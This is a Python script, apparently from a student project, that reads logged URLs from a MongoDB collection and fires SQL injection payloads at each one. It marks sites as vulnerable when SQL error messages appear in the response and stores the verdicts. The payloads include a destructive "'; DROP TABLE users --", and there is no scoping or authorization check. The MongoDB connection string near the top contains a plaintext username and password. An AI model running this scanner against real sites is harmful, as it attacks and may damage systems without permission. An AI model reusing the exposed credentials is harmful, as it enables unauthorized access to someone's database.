import requests
import datetime
from motor.motor_asyncio import AsyncIOMotorClient
from urllib.parse import urlencode
import asyncio

# MongoDB connection (replace with your actual connection string)
MONGO_URI = 'mongodb+srv://kaylumsmith:HS0KKaCbX4pbFiMM@diss-server.beqfh.mongodb.net/urlLogger?retryWrites=true&w=majority'
client = AsyncIOMotorClient(MONGO_URI)
db = client["urlLogger"]
collection = db["urllogs"]

# List of common SQL injection payloads
sql_payloads = [
    "' OR '1'='1",
    "'; DROP TABLE users --",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "' UNION SELECT null, version() --",
]

# SQL injection checker function
def check_sql_injection(url):
    results = []
    for payload in sql_payloads:
        try:
            # Construct the URL with the SQL payload as a query parameter
            params = {"id": payload}
            url_with_payload = f"{url}?{urlencode(params)}"
            response = requests.get(url_with_payload, timeout=10)

            # Check if the response contains signs of SQL errors or anomalies
            error_indicators = [
                "You have an error in your SQL syntax",
                "Warning: mysql_fetch",
                "Unclosed quotation mark",
                "Error Executing Database Query",
                "syntax error"
            ]

            if any(indicator in response.text for indicator in error_indicators):
                results.append({"payload": payload, "status": "vulnerable"})
            else:
                results.append({"payload": payload, "status": "not vulnerable"})
        except requests.RequestException as e:
            print(f"Error checking SQL injection for {url}: {e}")
            return {"error": "Failed to check SQL injection"}
    
    return results

# Fetch URLs that haven't been checked for SQL injection
async def get_urls_for_sql_check():
    return await collection.find({"sql_injection_check": {"$exists": False}}).to_list(length=100)

# Update MongoDB with SQL injection check results
async def update_sql_result(url_entry, sql_result):
    try:
        await collection.update_one(
            {"_id": url_entry["_id"]},
            {
                "$set": {
                    "sql_injection_check": sql_result,
                    "last_scanned_sql": datetime.datetime.utcnow()
                }
            }
        )
        print(f"Updated SQL injection result for {url_entry['url']}")
    except Exception as e:
        print(f"Error updating SQL injection result: {e}")

# Main scanning function
async def scan_and_update_sql():
    urls = await get_urls_for_sql_check()
    for url_entry in urls:
        url = url_entry["url"]
        print(f"Scanning URL for SQL injection: {url}")

        # Perform SQL injection check
        sql_result = check_sql_injection(url)

        # Update MongoDB with the results
        await update_sql_result(url_entry, sql_result)

# Run the scanning process
if __name__ == "__main__":
    asyncio.run(scan_and_update_sql())
